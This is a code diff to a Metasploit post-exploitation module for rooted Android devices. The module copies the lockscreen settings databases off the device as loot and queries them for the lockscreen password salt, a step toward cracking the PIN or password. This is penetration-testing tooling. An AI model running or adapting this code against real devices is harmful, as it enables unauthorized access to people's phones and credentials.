@@ -36,39 +36,42 @@ class MetasploitModule < Msf::Post
     ))
   end
 
-  def run
-
-    def read_store_sql(file_name, location)
-      # we need the .db file, as well as the supporting files .db-shm and .db-wal as they may contain
-      # the values we are looking for
-      db_loot_name = ''
-      ['', '-wal', '-shm'].each do |ext|
-        l = location + ext
-        f = file_name + ext
-        data = read_file(l)
-        if data.blank?
-          print_error("Unable to read #{l}")
-          return
-        end
-        print_good("Saved #{f} with length #{data.length}")
-
-        if ext == ''
-          loot_file = store_loot('SQLite3 DB', 'application/x-sqlite3', session, data, f, 'Android database')
-          db_loot_name = loot_file
-          next
-        end
-
-        loot_file = store_loot('SQLite3 DB', 'application/binary', session, data, f, 'Android database')
-
-        # in order for sqlite3 to see the -wal and -shm support files, we have to rename them
-        # we have to do this since the ext is > 3
-        # https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/report.rb#L391
-        new_name = "#{db_loot_name}#{ext}"
-        FileUtils.mv(loot_file, new_name)
+  def read_store_sql(location)
+    # we need the .db file, as well as the supporting files .db-shm and .db-wal as they may contain
+    # the values we are looking for
+    db_loot_name = ''
+    file_name = File.basename(location)
+    ['', '-wal', '-shm'].each do |ext|
+      l = location + ext
+      unless file_exist?(l)
+        next
       end
-      SQLite3::Database.new(db_loot_name)
-    end
+      f = file_name + ext
+      data = read_file(l)
+      if data.blank?
+        print_error("Unable to read #{l}")
+        return
+      end
+      print_good("Saved #{f} with length #{data.length}")
 
+      if ext == ''
+        loot_file = store_loot('SQLite3 DB', 'application/x-sqlite3', session, data, f, 'Android database')
+        db_loot_name = loot_file
+        next
+      end
+
+      loot_file = store_loot('SQLite3 DB', 'application/binary', session, data, f, 'Android database')
+
+      # in order for sqlite3 to see the -wal and -shm support files, we have to rename them
+      # we have to do this since the ext is > 3
+      # https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/report.rb#L391
+      new_name = "#{db_loot_name}#{ext}"
+      FileUtils.mv(loot_file, new_name)
+    end
+    SQLite3::Database.new(db_loot_name)
+  end
+
+  def run
     unless is_root?
       fail_with Failure::NoAccess, 'This module requires root permissions.'
     end
@@ -91,40 +94,29 @@ class MetasploitModule < Msf::Post
     print_status('Attempting to determine salt')
     os = cmd_exec("getprop ro.build.version.release")
     vprint_status("OS Version: #{os}")
-    if Gem::Version.new(os) < Gem::Version.new('4.3.0')
-      # this is untested.
-      begin
-        vprint_status('Attempting to load < 4.3.0 Android settings file')
-        db = read_store_sql('settings.db', '/data/data/com.android.providers.settings/databases/settings.db')
-        if db.nil?
-          print_error('Unable to load settings.db file.')
-          return
-        end
-        salt = db.execute('SELECT lockscreen.password_salt from secure;')
-      rescue SQLite3::SQLException
-        print_error("Failed to pull salt from database.  Command output: #{salt}")
+
+    locksettings_db = '/data/system/locksettings.db'
+    locksettings_sql = "select value from locksettings where name='lockscreen.password_salt';"
+    unless file_exist? locksettings_db
+      vprint_status("Could not find #{locksettings_db}, using settings.db")
+      locksettings_db = '/data/data/com.android.providers.settings/databases/settings.db'
+      locksettings_sql = "select value from secure where name='lockscreen.password_salt';"
+    end
+
+    begin
+      vprint_status("Attempting to load lockscreen db: #{locksettings_db}")
+      db = read_store_sql(locksettings_db)
+      if db.nil?
+        print_error('Unable to load settings.db file.')
         return
       end
-    else
-      begin
-        vprint_status('Attempting to load >= 4.3.0 Android settings file')
-        db = read_store_sql('locksettings.db', '/data/system/locksettings.db')
-        if db.nil?
-          print_error('Unable to load locksettings.db file.')
-          return
-        end
-        salt = db.execute("select value from locksettings where name='lockscreen.password_salt'")
-      rescue SQLite3::SQLException
-        print_error('Unable to retrieve salt value from database.')
-        return
-      end
+      salt = db.execute(locksettings_sql)
+    rescue SQLite3::SQLException
+      print_error("Failed to pull salt from database.  Command output: #{salt}")
+      return
     end
 
     salt = salt[0][0] # pull string from results Command output: [["5381737017539487883"]] may also be negative, therefore 20 char
-    unless salt.to_s.length.between?(19,20)
-      print_error("Unable to pull salt from database.  Command output: #{salt}")
-      return
-    end
 
     # convert from number string to hex and lowercase
     salt = salt.to_i.to_s(16)
